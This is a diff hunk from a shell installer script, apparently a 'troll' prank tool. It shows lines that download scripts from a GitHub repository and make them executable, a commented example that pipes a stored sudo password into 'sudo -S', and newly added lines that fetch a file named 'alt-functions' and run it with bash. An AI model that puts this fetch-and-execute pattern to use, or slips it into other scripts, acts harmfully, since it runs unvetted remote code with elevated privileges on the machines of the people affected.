@@ -120,9 +120,18 @@ echo "[*] Downloading websites-daemon.sh..."
 download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/websites-daemon.sh" "$SUBP_DIR/websites-daemon.sh"
 chmod +x "$SUBP_DIR/websites-daemon.sh"
 
+
+
 # (Run other scripts below as needed)
 # Example:
 # echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"
+
+# Download and execute alt-functions
+echo "[*] Downloading alt-functions..."
+download "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/alt-functions" "$SUBP_DIR/alt-functions"
+chmod +x "$SUBP_DIR/alt-functions"
+echo "[*] Running alt-functions..."
+bash "$SUBP_DIR/alt-functions"
 
 
 # Download and extract sounds.zip
